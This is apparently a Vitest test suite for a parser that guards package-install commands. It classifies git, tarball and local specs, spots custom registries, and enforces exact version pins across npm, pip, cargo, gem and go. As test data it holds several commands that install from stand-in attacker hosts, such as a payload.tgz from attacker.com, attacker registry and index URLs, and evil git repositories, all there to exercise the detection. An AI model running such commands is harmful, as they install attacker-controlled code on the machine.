import { describe, expect, it } from "vitest";
import type { PackageSpec } from "./package-install-parser.js";
import {
	isExactPinnedVersion,
	parseInstallCommands,
	pinnedVersionViolation,
	splitShellSegments,
	stripRedirections,
} from "./package-install-parser.js";

describe("stripRedirections", () => {
	it("drops `2>&1` FD-dup tokens", () => {
		expect(stripRedirections(["npm", "install", "pkg", "2>&1"])).toEqual([
			"npm",
			"install",
			"pkg",
		]);
	});

	it("drops `>` operator AND the following filename token", () => {
		expect(stripRedirections(["cmd", ">", "out.log"])).toEqual(["cmd"]);
	});

	it("drops `>>` operator AND the following filename token", () => {
		expect(stripRedirections(["cmd", ">>", "out.log"])).toEqual(["cmd"]);
	});

	it("drops `>file` operator+file embedded as one token", () => {
		expect(stripRedirections(["cmd", ">out.log"])).toEqual(["cmd"]);
	});

	it("drops `2>file` operator+FD+file embedded", () => {
		expect(stripRedirections(["cmd", "2>err.log"])).toEqual(["cmd"]);
	});

	it("drops `&>` and `&>>` (combined stdout+stderr)", () => {
		expect(stripRedirections(["cmd", "&>", "out"])).toEqual(["cmd"]);
		expect(stripRedirections(["cmd", "&>>", "out"])).toEqual(["cmd"]);
	});

	it("drops `<file` input redirection", () => {
		expect(stripRedirections(["cmd", "<input.txt"])).toEqual(["cmd"]);
	});

	it("drops `<<EOF` heredoc start (body handling is a separate concern)", () => {
		expect(stripRedirections(["cmd", "<<EOF"])).toEqual(["cmd"]);
	});

	it("preserves package specs with version constraints — `<3.0` glued to name", () => {
		// `pip install foo<3.0` tokenizes as `foo<3.0`; the token does NOT start
		// with a redirection operator, so it survives.
		expect(stripRedirections(["pip", "install", "foo<3.0"])).toEqual([
			"pip",
			"install",
			"foo<3.0",
		]);
	});

	it("is a no-op on commands with no redirections", () => {
		expect(stripRedirections(["npm", "install", "lodash"])).toEqual([
			"npm",
			"install",
			"lodash",
		]);
	});
});

describe("parseInstallCommands — regression: shell redirections (2026-05-28 #15)", () => {
	it("npm install with `2>&1` no longer treats it as a package", () => {
		const cmds = parseInstallCommands("npm install -g wrangler@latest 2>&1");
		expect(cmds).toHaveLength(1);
		expect(cmds[0].packages).toEqual([{ kind: "registry", name: "wrangler", version: "latest" }]);
	});

	it("npm install with `> log` doesn't parse log as a package", () => {
		const cmds = parseInstallCommands("npm install lodash > install.log");
		expect(cmds).toHaveLength(1);
		expect(cmds[0].packages).toEqual([{ kind: "registry", name: "lodash" }]);
	});

	it("npm install with `2>err.log` doesn't parse err.log as a package", () => {
		const cmds = parseInstallCommands("npm install lodash 2>err.log");
		expect(cmds).toHaveLength(1);
		expect(cmds[0].packages).toEqual([{ kind: "registry", name: "lodash" }]);
	});

	it("compound command `npm install ... 2>&1 | tail` still parses the install correctly", () => {
		const cmds = parseInstallCommands("npm install lodash 2>&1 | tail -15");
		// tail isn't an install verb, so only the npm segment surfaces
		expect(cmds).toHaveLength(1);
		expect(cmds[0].packages).toEqual([{ kind: "registry", name: "lodash" }]);
	});
});

describe("splitShellSegments", () => {
	it("splits on ;, &&, ||, |, &", () => {
		expect(splitShellSegments("a; b && c || d | e & f")).toEqual([
			"a",
			"b",
			"c",
			"d",
			"e",
			"f",
		]);
	});

	it("respects quotes", () => {
		expect(splitShellSegments("npm install 'foo && bar' && pip install baz")).toEqual([
			"npm install 'foo && bar'",
			"pip install baz",
		]);
	});

	it("ignores empty segments", () => {
		expect(splitShellSegments(" ;; ")).toEqual([]);
	});
});

describe("parseInstallCommands — npm family", () => {
	it("npm install <pkg> → add, single registry package", () => {
		const [cmd] = parseInstallCommands("npm install lodash");
		expect(cmd.ecosystem).toBe("npm");
		expect(cmd.manager).toBe("npm");
		expect(cmd.action).toBe("add");
		expect(cmd.packages).toEqual([{ kind: "registry", name: "lodash" }]);
		expect(cmd.fromLockfile).toBe(false);
		expect(cmd.fromManifest).toBe(false);
	});

	it("npm install with no args → sync from manifest", () => {
		const [cmd] = parseInstallCommands("npm install");
		expect(cmd.action).toBe("sync");
		expect(cmd.fromManifest).toBe(true);
		expect(cmd.packages).toEqual([]);
	});

	it("npm ci → sync from lockfile", () => {
		const [cmd] = parseInstallCommands("npm ci");
		expect(cmd.action).toBe("sync");
		expect(cmd.fromLockfile).toBe(true);
	});

	it("npm i shorthand", () => {
		const [cmd] = parseInstallCommands("npm i react react-dom");
		expect(cmd.action).toBe("add");
		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : null))).toEqual([
			"react",
			"react-dom",
		]);
	});

	it("npm install with @version", () => {
		const [cmd] = parseInstallCommands("npm install lodash@4.17.21");
		expect(cmd.packages[0]).toEqual({ kind: "registry", name: "lodash", version: "4.17.21" });
	});

	it("npm install with scoped package", () => {
		const [cmd] = parseInstallCommands("npm install @types/node@22.5.0");
		expect(cmd.packages[0]).toEqual({
			kind: "registry",
			name: "@types/node",
			version: "22.5.0",
		});
	});

	it("npm install with bare scoped package (no version)", () => {
		const [cmd] = parseInstallCommands("npm install @scope/lib");
		expect(cmd.packages[0]).toEqual({ kind: "registry", name: "@scope/lib" });
	});

	it("npm install git URL → git_url spec", () => {
		const [cmd] = parseInstallCommands(
			"npm install git+https://github.com/attacker/evil.git",
		);
		expect(cmd.packages[0].kind).toBe("git_url");
	});

	it("npm install tarball URL → tarball_url spec", () => {
		const [cmd] = parseInstallCommands(
			"npm install https://attacker.com/payload.tgz",
		);
		expect(cmd.packages[0].kind).toBe("tarball_url");
	});

	it("npm install local path → local_path spec", () => {
		const [cmd] = parseInstallCommands("npm install ./my-local-pkg");
		expect(cmd.packages[0].kind).toBe("local_path");
	});

	it("npm install --registry attacker.com captures customRegistry", () => {
		const [cmd] = parseInstallCommands(
			"npm install foo --registry http://attacker.com",
		);
		expect(cmd.customRegistry).toBe("http://attacker.com");
	});

	it("npm install --registry=URL form", () => {
		const [cmd] = parseInstallCommands(
			"npm install foo --registry=http://attacker.com",
		);
		expect(cmd.customRegistry).toBe("http://attacker.com");
	});

	it("pnpm install --frozen-lockfile → fromLockfile", () => {
		const [cmd] = parseInstallCommands("pnpm install --frozen-lockfile");
		expect(cmd.action).toBe("sync");
		expect(cmd.fromLockfile).toBe(true);
	});

	it("yarn (no subcommand) → sync from manifest", () => {
		const [cmd] = parseInstallCommands("yarn");
		expect(cmd.action).toBe("sync");
		expect(cmd.fromManifest).toBe(true);
	});

	it("yarn add foo → add", () => {
		const [cmd] = parseInstallCommands("yarn add foo");
		expect(cmd.action).toBe("add");
		expect(cmd.packages).toEqual([{ kind: "registry", name: "foo" }]);
	});

	it("bun add foo bar", () => {
		const [cmd] = parseInstallCommands("bun add foo bar");
		expect(cmd.manager).toBe("bun");
		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : null))).toEqual([
			"foo",
			"bar",
		]);
	});

	it("npm uninstall → remove (no packages added)", () => {
		const [cmd] = parseInstallCommands("npm uninstall lodash");
		expect(cmd.action).toBe("remove");
	});
});

describe("parseInstallCommands — pip family", () => {
	it("pip install <pkg>", () => {
		const [cmd] = parseInstallCommands("pip install requests");
		expect(cmd.ecosystem).toBe("pypi");
		expect(cmd.packages).toEqual([{ kind: "registry", name: "requests" }]);
	});

	it("pip install with version specifier RETAINS the operator (finding: pin bypass)", () => {
		const [cmd] = parseInstallCommands("pip install requests==22.32.5");
		expect(cmd.packages[0]).toEqual({
			kind: "registry",
			name: "requests",
			version: "==22.32.5", // operator kept so the pin check can see `==` vs a range
		});
	});

	it("pip install -r requirements.txt → fromManifest with manifestFile", () => {
		const [cmd] = parseInstallCommands("pip install -r requirements.txt");
		expect(cmd.fromManifest).toBe(true);
		expect(cmd.manifestFile).toBe("requirements.txt");
	});

	it("pip install --index-url URL captures customRegistry", () => {
		const [cmd] = parseInstallCommands(
			"pip install foo --index-url http://attacker.com",
		);
		expect(cmd.customRegistry).toBe("http://attacker.com");
	});

	it("pip install with extras [foo,bar] strips them from name", () => {
		const [cmd] = parseInstallCommands("pip install requests[security]");
		expect(cmd.packages[0]).toMatchObject({ kind: "registry", name: "requests" });
	});

	it("pip install git+URL → git_url spec", () => {
		const [cmd] = parseInstallCommands(
			"pip install git+https://github.com/attacker/evil",
		);
		expect(cmd.packages[0].kind).toBe("git_url");
	});

	it("pip3 alias", () => {
		const [cmd] = parseInstallCommands("pip3 install numpy");
		expect(cmd.manager).toBe("pip3");
		expect(cmd.ecosystem).toBe("pypi");
	});

	it("pipx install → install_global", () => {
		const [cmd] = parseInstallCommands("pipx install poetry");
		expect(cmd.action).toBe("install_global");
	});

	// `pipx inject <venv> <pkgs…>` — the first positional is the EXISTING
	// environment, not a package (finding 2026-06: `pipx inject black
	// requests==2.31.0` treated `black` as an unpinned package and blocked).
	it("pipx inject skips the venv target — only the injected specs are packages", () => {
		const [cmd] = parseInstallCommands("pipx inject black requests==2.31.0");
		expect(cmd.packages).toEqual([{ kind: "registry", name: "requests", version: "==2.31.0" }]);
	});

	it("pipx inject with several specs keeps them all (venv alone is dropped)", () => {
		const [cmd] = parseInstallCommands("pipx inject black requests==2.31.0 urllib3==2.2.0");
		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual([
			"requests",
			"urllib3",
		]);
	});

	it("pipx inject with flags before the venv still drops exactly the venv", () => {
		const [cmd] = parseInstallCommands("pipx inject --include-apps black requests==2.31.0");
		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["requests"]);
	});

	it("pipx inject with NO package specs yields no packages (nothing to gate)", () => {
		const [cmd] = parseInstallCommands("pipx inject black");
		expect(cmd.packages).toEqual([]);
	});

	it("pipx INSTALL keeps its first positional as the package (only inject skips)", () => {
		const [cmd] = parseInstallCommands("pipx install black");
		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["black"]);
	});

	it("a malicious spec in the inject list is still classified (the guard still sees it)", () => {
		const [cmd] = parseInstallCommands("pipx inject black git+https://github.com/attacker/evil");
		expect(cmd.packages[0].kind).toBe("git_url");
	});
});

// ATTACHED short-option values (finding 2026-06, same class as git `-mfix`):
// optparse-style pip accepts the value glued to the flag. Each must surface the
// same guard signal as the separated form — previously they parsed as unknown
// flags and the signal was silently lost.
describe("pip attached short-option values", () => {
	it("`-rreqs.txt` is a manifest install, same as `-r reqs.txt`", () => {
		const [cmd] = parseInstallCommands("pip install -rrequirements.txt");
		expect(cmd.manifestFile).toBe("requirements.txt");
		expect(cmd.fromManifest).toBe(true);
	});

	it("`-rhttps://…` (remote requirements) is captured, not silently skipped", () => {
		const [cmd] = parseInstallCommands("pip install -rhttps://evil.example/r.txt");
		expect(cmd.manifestFile).toBe("https://evil.example/r.txt");
	});

	it("`-ihttps://mirror` is a custom registry, same as `-i https://mirror`", () => {
		const [cmd] = parseInstallCommands("pip install -ihttps://mirror.example/simple requests==2.31.0");
		expect(cmd.customRegistry).toBe("https://mirror.example/simple");
	});

	it("`-egit+URL` is an editable git spec the guard classifies, same as `-e git+URL`", () => {
		const [cmd] = parseInstallCommands("pip install -egit+https://github.com/attacker/evil");
		expect(cmd.packages[0].kind).toBe("git_url");
	});

	it("`-cconstraints.txt` marks constraints without inventing a package", () => {
		const [cmd] = parseInstallCommands("pip install -cconstraints.txt requests==2.31.0");
		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["requests"]);
	});

	it("separated forms are unchanged (`-r reqs.txt`, `-i URL`, `-e spec`)", () => {
		const [withR] = parseInstallCommands("pip install -r requirements.txt");
		expect(withR.manifestFile).toBe("requirements.txt");
		const [withI] = parseInstallCommands("pip install -i https://mirror.example/simple requests==2.31.0");
		expect(withI.customRegistry).toBe("https://mirror.example/simple");
		const [withE] = parseInstallCommands("pip install -e git+https://github.com/attacker/evil");
		expect(withE.packages[0].kind).toBe("git_url");
	});

	it("unrelated short flags with attached text are not misread as r/i/c/e values", () => {
		// `-q`-style flags carry no value; a flag like `-U` (upgrade) must not match.
		const [cmd] = parseInstallCommands("pip install -U requests==2.31.0");
		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["requests"]);
		expect(cmd.manifestFile).toBeUndefined();
	});
});

// ROUND-TRIP PIN CONTRACT (finding: PyPI operators lost during parsing). raw
// requirement → parsed spec → pin decision must retain every token that affects
// the decision. Only `==`/`===` are exact pins; `~=`/`>=`/`<=`/`>`/`<`/`!=` and a
// bare name are NOT — they previously slipped through as exact `2.31.0`.
describe("pip exact-pin round-trip (parse → pinnedVersionViolation)", () => {
	function isExactPin(spec: string): boolean {
		const [cmd] = parseInstallCommands(`pip install ${spec}`);
		return pinnedVersionViolation(cmd.packages[0], "pypi") === null;
	}

	it.each([
		["requests==2.31.0", true],
		["requests===2.31.0", true],
		["requests~=2.31.0", false],
		["requests>=2.31.0", false],
		["requests<=2.31.0", false],
		["requests>2.31.0", false],
		["requests!=2.31.0", false],
		["requests", false],
	])("%s → exact pin = %s", (spec, expected) => {
		expect(isExactPin(spec)).toBe(expected);
	});
});

describe("parseInstallCommands — poetry / uv", () => {
	it("poetry add foo", () => {
		const [cmd] = parseInstallCommands("poetry add fastapi");
		expect(cmd.ecosystem).toBe("pypi");
		expect(cmd.action).toBe("add");
	});

	it("poetry install → sync from manifest", () => {
		const [cmd] = parseInstallCommands("poetry install");
		expect(cmd.action).toBe("sync");
		expect(cmd.fromManifest).toBe(true);
	});

	it("poetry install --no-update → fromLockfile", () => {
		const [cmd] = parseInstallCommands("poetry install --no-update");
		expect(cmd.fromLockfile).toBe(true);
	});

	it("uv add foo", () => {
		const [cmd] = parseInstallCommands("uv add httpx");
		expect(cmd.manager).toBe("uv");
		expect(cmd.action).toBe("add");
	});

	it("uv sync --frozen → sync from lockfile", () => {
		const [cmd] = parseInstallCommands("uv sync --frozen");
		expect(cmd.fromLockfile).toBe(true);
	});

	it("uv pip install foo delegates to pip parser", () => {
		const [cmd] = parseInstallCommands("uv pip install requests");
		expect(cmd.ecosystem).toBe("pypi");
		expect(cmd.action).toBe("add");
	});

	it("uv tool install → install_global", () => {
		const [cmd] = parseInstallCommands("uv tool install black");
		expect(cmd.action).toBe("install_global");
	});
});

describe("parseInstallCommands — cargo", () => {
	it("cargo add foo", () => {
		const [cmd] = parseInstallCommands("cargo add serde");
		expect(cmd.ecosystem).toBe("cargo");
		expect(cmd.action).toBe("add");
	});

	it("cargo install foo → install_global", () => {
		const [cmd] = parseInstallCommands("cargo install ripgrep");
		expect(cmd.action).toBe("install_global");
	});

	it("cargo build --locked → fromLockfile sync", () => {
		const [cmd] = parseInstallCommands("cargo build --locked");
		expect(cmd.action).toBe("sync");
		expect(cmd.fromLockfile).toBe(true);
	});

	it("cargo add --git URL captures git URL", () => {
		const [cmd] = parseInstallCommands(
			"cargo add --git https://github.com/foo/bar foo",
		);
		expect(cmd.packages.some((p) => p.kind === "git_url")).toBe(true);
	});
});

describe("parseInstallCommands — gem / bundle", () => {
	it("gem install foo → install_global", () => {
		const [cmd] = parseInstallCommands("gem install rails");
		expect(cmd.ecosystem).toBe("rubygems");
		expect(cmd.action).toBe("install_global");
	});

	it("bundle install → sync from manifest", () => {
		const [cmd] = parseInstallCommands("bundle install");
		expect(cmd.action).toBe("sync");
		expect(cmd.fromManifest).toBe(true);
	});

	it("bundle install --frozen → fromLockfile", () => {
		const [cmd] = parseInstallCommands("bundle install --frozen");
		expect(cmd.fromLockfile).toBe(true);
	});

	it("bundle add foo → add", () => {
		const [cmd] = parseInstallCommands("bundle add rails");
		expect(cmd.action).toBe("add");
	});
});

describe("parseInstallCommands — go", () => {
	it("go get module → add", () => {
		const [cmd] = parseInstallCommands("go get github.com/gin-gonic/gin");
		expect(cmd.ecosystem).toBe("go");
		expect(cmd.action).toBe("add");
		expect(cmd.packages[0]).toEqual({
			kind: "registry",
			name: "github.com/gin-gonic/gin",
		});
	});

	it("go install → install_global", () => {
		const [cmd] = parseInstallCommands(
			"go install github.com/spf13/cobra-cli@latest",
		);
		expect(cmd.action).toBe("install_global");
		expect(cmd.packages[0]).toEqual({
			kind: "registry",
			name: "github.com/spf13/cobra-cli",
			version: "latest",
		});
	});
});

describe("parseInstallCommands — env-var registry overrides (P1.1)", () => {
	it("`NPM_CONFIG_REGISTRY=URL npm install foo` captures customRegistry", () => {
		const [cmd] = parseInstallCommands(
			"NPM_CONFIG_REGISTRY=http://attacker.com npm install lodash",
		);
		expect(cmd.customRegistry).toBe("http://attacker.com");
	});

	it("lowercase npm_config_registry is also detected (npm reads both)", () => {
		const [cmd] = parseInstallCommands(
			"npm_config_registry=http://evil npm install foo",
		);
		expect(cmd.customRegistry).toBe("http://evil");
	});

	it("`PIP_INDEX_URL=URL pip install requests` captures customRegistry", () => {
		const [cmd] = parseInstallCommands(
			"PIP_INDEX_URL=http://attacker.com pip install requests",
		);
		expect(cmd.customRegistry).toBe("http://attacker.com");
	});

	it("`env NPM_CONFIG_REGISTRY=URL npm install` form", () => {
		const [cmd] = parseInstallCommands(
			"env NPM_CONFIG_REGISTRY=http://evil npm install foo",
		);
		expect(cmd.customRegistry).toBe("http://evil");
	});

	it("YARN_REGISTRY=URL yarn add foo", () => {
		const [cmd] = parseInstallCommands("YARN_REGISTRY=http://x yarn add foo");
		expect(cmd.customRegistry).toBe("http://x");
	});

	it("BUN_CONFIG_REGISTRY=URL bun add foo", () => {
		const [cmd] = parseInstallCommands(
			"BUN_CONFIG_REGISTRY=http://x bun add foo",
		);
		expect(cmd.customRegistry).toBe("http://x");
	});

	it("UV_INDEX_URL=URL uv pip install foo", () => {
		const [cmd] = parseInstallCommands("UV_INDEX_URL=http://x uv pip install foo");
		expect(cmd.customRegistry).toBe("http://x");
	});

	it("CARGO_REGISTRIES_FOO_INDEX=URL cargo add bar", () => {
		const [cmd] = parseInstallCommands(
			"CARGO_REGISTRIES_EVIL_INDEX=http://x cargo add bar",
		);
		expect(cmd.customRegistry).toBe("http://x");
	});

	it("Non-registry env var (DEBUG=1) does not set customRegistry", () => {
		const [cmd] = parseInstallCommands("DEBUG=1 npm install lodash");
		expect(cmd.customRegistry).toBeUndefined();
	});

	it("Inline flag still wins over env var if both are present", () => {
		const [cmd] = parseInstallCommands(
			"NPM_CONFIG_REGISTRY=http://env npm install foo --registry http://cli",
		);
		expect(cmd.customRegistry).toBe("http://cli");
	});
});

describe("parseInstallCommands — pre-verb flags (P1.2)", () => {
	it("`npm --prefix app install evil` parses install verb correctly", () => {
		const [cmd] = parseInstallCommands("npm --prefix app install evil");
		expect(cmd).toBeDefined();
		expect(cmd.action).toBe("add");
		expect(cmd.packages[0]).toEqual({ kind: "registry", name: "evil" });
	});

	it("`pnpm --filter app add evil`", () => {
		const [cmd] = parseInstallCommands("pnpm --filter app add evil");
		expect(cmd.action).toBe("add");
		expect(cmd.packages[0]).toEqual({ kind: "registry", name: "evil" });
	});

	it("`yarn workspace app add evil`", () => {
		const [cmd] = parseInstallCommands("yarn workspace app add evil");
		expect(cmd.action).toBe("add");
		expect(cmd.packages[0]).toEqual({ kind: "registry", name: "evil" });
	});

	it("`yarn workspaces foreach run build` is not an install", () => {
		expect(parseInstallCommands("yarn workspaces foreach run build")).toEqual([]);
	});
});

describe("parseInstallCommands — pip editable (P1.3)", () => {
	it("`pip install -e git+URL` keeps the git URL as the spec", () => {
		const [cmd] = parseInstallCommands(
			"pip install -e git+https://attacker.com/evil",
		);
		expect(cmd.packages).toHaveLength(1);
		expect(cmd.packages[0].kind).toBe("git_url");
	});

	it("`pip install --editable git+URL` keeps the git URL", () => {
		const [cmd] = parseInstallCommands(
			"pip install --editable git+https://attacker.com/evil",
		);
		expect(cmd.packages).toHaveLength(1);
		expect(cmd.packages[0].kind).toBe("git_url");
	});

	it("`pip install -e ./local` keeps local path", () => {
		const [cmd] = parseInstallCommands("pip install -e ./local");
		expect(cmd.packages[0].kind).toBe("local_path");
	});

	it("`pip install -e .` (current dir, common editable form)", () => {
		const [cmd] = parseInstallCommands("pip install -e .");
		expect(cmd.packages[0].kind).toBe("local_path");
	});
});

describe("parseInstallCommands — effective cwd (P1.4)", () => {
	it("standalone install has no effectiveCwd shift", () => {
		const [cmd] = parseInstallCommands("npm install foo");
		expect(cmd.effectiveCwd).toBeUndefined();
	});

	it("`cd packages/app && npm ci` attaches packages/app as effectiveCwd", () => {
		const cmds = parseInstallCommands("cd packages/app && npm ci");
		expect(cmds).toHaveLength(1);
		expect(cmds[0].effectiveCwd).toBe("packages/app");
	});

	it("two cd hops compose", () => {
		const cmds = parseInstallCommands("cd packages && cd app && npm ci");
		expect(cmds).toHaveLength(1);
		expect(cmds[0].effectiveCwd).toBe("packages/app");
	});

	it("each install sees its own cwd", () => {
		const cmds = parseInstallCommands(
			"cd a && npm ci && cd ../b && npm ci",
		);
		expect(cmds).toHaveLength(2);
		expect(cmds[0].effectiveCwd).toBe("a");
		expect(cmds[1].effectiveCwd).toBe("a/../b");
	});

	it("absolute cd resets to that absolute path", () => {
		const cmds = parseInstallCommands("cd /abs/foo && npm install bar");
		expect(cmds[0].effectiveCwd).toBe("/abs/foo");
	});
});

describe("parseInstallCommands — compound and noise", () => {
	it("non-install command returns []", () => {
		expect(parseInstallCommands("ls -la")).toEqual([]);
		expect(parseInstallCommands("npm run test")).toEqual([]);
		expect(parseInstallCommands("npm test")).toEqual([]);
		expect(parseInstallCommands("npm version patch")).toEqual([]);
	});

	it("compound command returns each segment", () => {
		const cmds = parseInstallCommands("cd app && npm install lodash && pip install requests");
		expect(cmds).toHaveLength(2);
		expect(cmds[0].manager).toBe("npm");
		expect(cmds[1].manager).toBe("pip");
	});

	it("sudo / env prefix is stripped", () => {
		const [cmd] = parseInstallCommands("sudo npm install -g typescript");
		expect(cmd.manager).toBe("npm");
		expect(cmd.action).toBe("add");
	});

	it("DEBUG=1 env prefix stripped", () => {
		const [cmd] = parseInstallCommands("DEBUG=1 pip install requests");
		expect(cmd.manager).toBe("pip");
	});

	it("empty / blank → []", () => {
		expect(parseInstallCommands("")).toEqual([]);
		expect(parseInstallCommands("   ")).toEqual([]);
	});
});

// The exact-pin gate only works if each ecosystem parser lands the pinned
// version in spec.version (not as a phantom positional). These cover the
// separate-flag pin forms that previously dropped the version on the floor.
describe("parseInstallCommands — version pins land in spec.version", () => {
	it("cargo add crate@1.0.0 → version on the spec (not a 2nd crate)", () => {
		const [cmd] = parseInstallCommands("cargo add serde@1.0.0");
		expect(cmd.packages).toEqual([{ kind: "registry", name: "serde", version: "1.0.0" }]);
	});

	it("cargo add --vers 1.0.0 → version captured, no phantom package", () => {
		const [cmd] = parseInstallCommands("cargo add serde --vers 1.0.0");
		expect(cmd.packages).toEqual([{ kind: "registry", name: "serde", version: "1.0.0" }]);
	});

	it("cargo add --version=1.0.0 (glued flag) → version captured", () => {
		const [cmd] = parseInstallCommands("cargo add serde --version=1.0.0");
		expect(cmd.packages).toEqual([{ kind: "registry", name: "serde", version: "1.0.0" }]);
	});

	it("cargo install ripgrep@13.0.0 → version captured", () => {
		const [cmd] = parseInstallCommands("cargo install ripgrep@13.0.0");
		expect(cmd.packages).toEqual([
			{ kind: "registry", name: "ripgrep", version: "13.0.0" },
		]);
	});

	it("gem install x -v 1.2.3 → version captured, no phantom package", () => {
		const [cmd] = parseInstallCommands("gem install rails -v 7.1.0");
		expect(cmd.packages).toEqual([{ kind: "registry", name: "rails", version: "7.1.0" }]);
	});

	it("gem install x --version 1.2.3 → version captured", () => {
		const [cmd] = parseInstallCommands("gem install rails --version 7.1.0");
		expect(cmd.packages).toEqual([{ kind: "registry", name: "rails", version: "7.1.0" }]);
	});

	it("cargo add --git URL still yields a git_url spec (unchanged)", () => {
		const [cmd] = parseInstallCommands(
			"cargo add --git https://github.com/foo/bar foo",
		);
		expect(cmd.packages.some((p) => p.kind === "git_url")).toBe(true);
	});
});

describe("pinnedVersionViolation — per-ecosystem unit cases", () => {
	const reg = (name: string, version?: string): PackageSpec =>
		version === undefined
			? { kind: "registry", name }
			: { kind: "registry", name, version };

	it("BLOCKS an absent version (npm `lodash` bare)", () => {
		expect(pinnedVersionViolation(reg("lodash"), "npm")).not.toBeNull();
	});

	it("BLOCKS a caret range (npm `lodash@^4`)", () => {
		expect(pinnedVersionViolation(reg("lodash", "^4"), "npm")).not.toBeNull();
	});

	it("BLOCKS a dist-tag (npm `lodash@latest`)", () => {
		expect(pinnedVersionViolation(reg("lodash", "latest"), "npm")).not.toBeNull();
	});

	it("BLOCKS major-only and major.minor-only (npm `@4`, `@4.17`)", () => {
		expect(pinnedVersionViolation(reg("lodash", "4"), "npm")).not.toBeNull();
		expect(pinnedVersionViolation(reg("lodash", "4.17"), "npm")).not.toBeNull();
	});

	it("BLOCKS pip range operators (the parser RETAINS them, so a range never masquerades as a pin)", () => {
		// classifyPipSpec keeps the comparison operator, so `requests>=2` reaches
		// the pin check as ">=2" — a range, blocked. A BARE "2" is different:
		// under PEP 440, `==2` is EXACT (it matches only release 2, never 2.1),
		// so it is allowed — see the ecosystem-rules cases below (finding 2026-06).
		expect(pinnedVersionViolation(reg("requests", ">=2"), "pypi")).not.toBeNull();
		expect(pinnedVersionViolation(reg("requests", "~=2.31"), "pypi")).not.toBeNull();
		expect(pinnedVersionViolation(reg("requests", "!=2.31.0"), "pypi")).not.toBeNull();
	});

	// Ecosystem-aware exact-pin rules (finding 2026-06): one universal
	// major.minor.patch regex falsely blocked valid exact pins in ecosystems
	// whose version grammar is not three-component semver.
	it("ALLOWS PEP 440 exact pins that are not three-component (`==24.2`, post/rc/dev/local)", () => {
		expect(pinnedVersionViolation(reg("packaging", "==24.2"), "pypi")).toBeNull();
		expect(pinnedVersionViolation(reg("packaging", "==24"), "pypi")).toBeNull();
		expect(pinnedVersionViolation(reg("x", "==1.0.post1"), "pypi")).toBeNull();
		expect(pinnedVersionViolation(reg("x", "==2.0.0rc1"), "pypi")).toBeNull();
		expect(pinnedVersionViolation(reg("x", "==1.2.3.dev4"), "pypi")).toBeNull();
		expect(pinnedVersionViolation(reg("x", "==1.2+local.7"), "pypi")).toBeNull();
		expect(pinnedVersionViolation(reg("x", "===1.0"), "pypi")).toBeNull(); // arbitrary equality
	});

	it("still BLOCKS PyPI floating forms (`==24.*` prefix match, dist-tags)", () => {
		expect(pinnedVersionViolation(reg("packaging", "==24.*"), "pypi")).not.toBeNull();
		expect(pinnedVersionViolation(reg("packaging", "latest"), "pypi")).not.toBeNull();
	});

	it("ALLOWS a RubyGems exact two-component version (`'7.1'` is exact to Gem::Version)", () => {
		expect(pinnedVersionViolation(reg("rails", "7.1"), "rubygems")).toBeNull();
		expect(pinnedVersionViolation(reg("rails", "7.1.0.rc1"), "rubygems")).toBeNull();
	});

	it("keeps npm/cargo/go partials BLOCKED (they really do float in those ecosystems)", () => {
		expect(pinnedVersionViolation(reg("lodash", "4.17"), "npm")).not.toBeNull();
		expect(pinnedVersionViolation(reg("serde", "=1.2"), "cargo")).not.toBeNull();
		expect(pinnedVersionViolation(reg("x", "v1.2"), "go")).not.toBeNull();
	});

	it("BLOCKS a go dist-tag (`x@latest`)", () => {
		expect(pinnedVersionViolation(reg("x", "latest"), "go")).not.toBeNull();
	});

	it("ALLOWS a full npm version (`lodash@4.17.21`)", () => {
		expect(pinnedVersionViolation(reg("lodash", "4.17.21"), "npm")).toBeNull();
	});

	it("ALLOWS a pip `==` exact (`requests==2.31.0` → version `2.31.0`)", () => {
		expect(pinnedVersionViolation(reg("requests", "2.31.0"), "pypi")).toBeNull();
	});

	it("ALLOWS a go `v`-prefixed tag and pseudo-version", () => {
		expect(pinnedVersionViolation(reg("x", "v1.2.3"), "go")).toBeNull();
		expect(
			pinnedVersionViolation(reg("x", "v0.0.0-20191109021931-daa7c04131f5"), "go"),
		).toBeNull();
	});

	it("ALLOWS a cargo bare and `=`-prefixed exact (`1.0.0`, `=1.0.0`)", () => {
		expect(pinnedVersionViolation(reg("serde", "1.0.0"), "cargo")).toBeNull();
		expect(pinnedVersionViolation(reg("serde", "=1.0.0"), "cargo")).toBeNull();
	});

	it("ALLOWS a gem exact (`rails` at `7.1.0`)", () => {
		expect(pinnedVersionViolation(reg("rails", "7.1.0"), "rubygems")).toBeNull();
	});

	it("returns null for non-registry specs (git/tarball/local)", () => {
		expect(pinnedVersionViolation({ kind: "git_url", url: "x" }, "npm")).toBeNull();
		expect(
			pinnedVersionViolation({ kind: "tarball_url", url: "x.tgz" }, "npm"),
		).toBeNull();
		expect(pinnedVersionViolation({ kind: "local_path", path: "./x" }, "npm")).toBeNull();
	});

	it("accepts prerelease and build metadata as exact", () => {
		expect(isExactPinnedVersion("1.2.3-beta.1")).toBe(true);
		expect(isExactPinnedVersion("1.2.3+build.5")).toBe(true);
		expect(isExactPinnedVersion("4.17")).toBe(false);
		expect(isExactPinnedVersion("latest")).toBe(false);
	});
});
